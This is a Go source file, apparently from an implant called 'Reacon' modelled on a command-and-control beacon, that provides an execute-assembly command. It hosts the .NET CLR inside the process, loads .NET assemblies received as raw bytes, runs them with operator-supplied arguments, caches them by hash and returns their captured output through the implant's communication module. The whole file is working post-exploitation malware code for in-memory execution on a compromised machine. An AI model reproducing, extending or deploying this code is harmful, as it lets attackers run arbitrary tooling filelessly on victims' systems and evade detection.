package commands

import (
	"Reacon/pkg/communication"
	"crypto/sha256"
	"errors"
	"fmt"
	"github.com/Ne0nd0g/go-clr"
	"log"
	"strings"
	"sync"
	"time"
)

var (
	clrInstance *CLRInstance
	assemblies  []*assembly
)

type assembly struct {
	methodInfo *clr.MethodInfo
	hash       [32]byte
}

type CLRInstance struct {
	runtimeHost *clr.ICORRuntimeHost
	sync.Mutex
}

func init() {
	clrInstance = &CLRInstance{}
	assemblies = make([]*assembly, 0)
}

func (c *CLRInstance) GetRuntimeHost(runtime string, debug bool) *clr.ICORRuntimeHost {
	c.Lock()
	defer c.Unlock()
	if c.runtimeHost == nil {
		if debug {
			log.Printf("Initializing CLR runtime host")
		}
		c.runtimeHost, _ = clr.LoadCLR(runtime)
		err := clr.RedirectStdoutStderr()
		if err != nil {
			if debug {
				log.Printf("could not redirect stdout/stderr: %v\n", err)
			}
		}
	}
	return c.runtimeHost
}

func addAssembly(methodInfo *clr.MethodInfo, data []byte) {
	asmHash := sha256.Sum256(data)
	asm := &assembly{methodInfo: methodInfo, hash: asmHash}
	assemblies = append(assemblies, asm)
}

func getAssembly(data []byte) *assembly {
	asmHash := sha256.Sum256(data)
	for _, asm := range assemblies {
		if asm.hash == asmHash {
			return asm
		}
	}
	return nil
}

func LoadBin(data []byte, assemblyArgs []string, runtime string, debug bool) (string, error) {
	var (
		methodInfo *clr.MethodInfo
		err        error
	)

	rtHost := clrInstance.GetRuntimeHost(runtime, debug)
	if rtHost == nil {
		time.Sleep(time.Second)
		rtHost = clrInstance.GetRuntimeHost(runtime, debug)
		if rtHost == nil {
			return "", errors.New("Could not load CLR runtime host")
		}
	}

	//time.Sleep(time.Millisecond * 500)

	if asm := getAssembly(data); asm != nil {
		methodInfo = asm.methodInfo
	} else {
		methodInfo, err = clr.LoadAssembly(rtHost, data)
		if err != nil {
			if debug {
				log.Printf("could not load assembly: %v\n", err)
			}
			return "", err
		}
		addAssembly(methodInfo, data)
	}
	if len(assemblyArgs) == 1 && assemblyArgs[0] == "" {
		// for methods like Main(String[] args), if we pass an empty string slice
		// the clr loader will not pass the argument and look for a method with
		// no arguments, which won't work
		assemblyArgs = []string{" "}
	}
	if debug {
		log.Printf("Assembly loaded, methodInfo: %+v\n", methodInfo)
		log.Printf("Calling assembly with args: %+v\n", assemblyArgs)
	}
	stdout, stderr := clr.InvokeAssembly(methodInfo, assemblyArgs)
	if debug {
		log.Printf("Got output: %s\n%s\n", stdout, stderr)
	}
	return fmt.Sprintf("%s\n%s", stdout, stderr), nil
}

func ExecuteAssembly(sh []byte, arguments string) ([]byte, error) {

	go func() {
		debug := true
		params := strings.Split(arguments, " ")
		stdout, err := LoadBin(sh, params, "v4.8", debug)
		if err != nil {
			fmt.Printf("[DEBUG] Returned STDOUT/STDERR: \n%s\n", stdout)
			communication.ErrorProcess(errors.New(stdout))
			communication.ErrorProcess(err)
			return
		}
		communication.DataProcess(0, []byte(stdout))
	}()

	return []byte("[*] Executing..."), nil
}
